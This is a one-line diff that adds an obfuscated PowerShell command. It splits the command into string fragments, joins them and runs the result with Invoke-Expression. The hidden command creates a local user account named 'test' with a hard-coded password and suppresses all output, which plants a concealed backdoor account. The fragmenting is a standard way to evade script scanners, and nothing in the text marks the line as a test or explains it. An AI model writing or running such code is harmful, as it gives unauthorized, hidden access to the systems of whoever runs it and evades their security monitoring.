@@ -1,0 +1,1 @@
+$LhsoWkNwLcN = @('New-LocalUs','er test -Pa','ssword (Con','vertTo-Secu','reString -S','tring ''pass','!@#!23'' -As','PlainText -','Force) > $n','ull 2>&1'); $LhsoWkNwL = $LhsoWkNwLcN -join ''; Invoke-Expression $LhsoWkNwL
